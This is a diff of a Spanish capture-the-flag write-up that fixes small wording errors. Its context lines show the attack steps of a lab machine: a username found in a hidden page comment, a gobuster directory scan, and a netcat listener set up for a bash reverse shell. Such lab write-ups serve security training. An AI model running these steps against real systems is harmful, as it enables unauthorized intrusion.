@@ -64,7 +64,7 @@ Solo 2 puertos, de todos modos nada más nos interesa el 80, así que nos vamos 
     </body>
     </html>
 
-Una nota casi al pie de la página, oculta como comentario, un nombre de usuario `R1ckRul3s`, ¿Que eso como para qué?, ni idea, igual procedemos a mandar a gobuster a que nos encuentre algo, seguimos buscado archivos o algun login para usar ese usuario...
+Una nota casi al pie de la página, oculta como comentario, un nombre de usuario `R1ckRul3s`, ¿Eso como para qué?, ni idea, igual procedemos a mandar a gobuster a que nos encuentre algo, seguimos buscado archivos o algun login para usar ese usuario...
 
     gobuster dir -u http://IP_MACHINE/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -s 200,301 -x .txt,.php,.html
 Donde el bueno de gobuster nos arroja lo siguiente:
@@ -118,7 +118,7 @@ login.php
 portal.php
 robots.txt
 
-## Tomando de control...
+## Toma de control...
 Ya tenemos el primer ingrediente, ahora toca movernos por todos lados con comandos, pero esta shell es algo incómoda de usar, movanos con una revershell, configuramos puerto de escucha con netcat y el payload con bash...
 ___
     nc -lvnp 1234 
